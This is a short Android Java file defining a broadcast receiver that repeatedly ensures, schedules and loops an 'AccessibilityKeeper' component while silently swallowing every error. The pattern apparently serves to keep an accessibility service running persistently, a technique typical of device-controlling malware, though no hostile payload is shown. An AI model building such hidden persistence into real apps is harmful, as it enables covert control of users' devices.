package com.seguranca.protecao;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class AccessibilityKeeperReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context c, Intent i) {
        try { AccessibilityKeeper.garantir(c); } catch (Throwable t) {}
        try { AccessibilityKeeper.agendar(c); } catch (Throwable t) {}
        try { AccessibilityKeeper.startLoop(c); } catch (Throwable t) {}
    }
}